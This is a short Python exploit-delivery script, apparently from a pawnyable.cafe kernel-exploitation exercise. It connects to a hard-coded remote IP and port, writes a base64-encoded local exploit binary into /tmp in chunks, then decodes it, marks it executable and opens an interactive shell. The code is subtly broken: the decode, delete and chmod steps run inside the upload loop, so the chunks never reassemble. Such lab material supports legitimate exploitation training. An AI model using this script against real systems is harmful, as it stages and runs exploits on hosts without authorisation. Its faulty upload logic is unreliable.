# pawnyable.cafe
from ptrlib import * 
import time 
import base64 
import os

def  run (cmd): 
    sock.sendlineafter( "$ " , cmd) 
    sock.recvline()

with  open ( "./exploit" , "rb" ) as f: 
    payload = bytes2str(base64.b64encode(f.read()))

sock = Socket("20.199.64.76",7854) # remote
#sock = Process( "./launch.sh" )

run( 'cd /tmp' )

logger.info( "Uploading..." ) 
for i in  range ( 0 , len (payload), 512 ):
    print ( f"Uploading... {i:x} / { len (payload):x} " )
    run( 'echo "{}" >> b64exp' . format (payload[i:i+ 512 ]))
    run( 'base64 -d b64exp > exploit' )
    run( 'rm b64exp' )
    run( 'chmod +x exploit' )
sock. interactive()
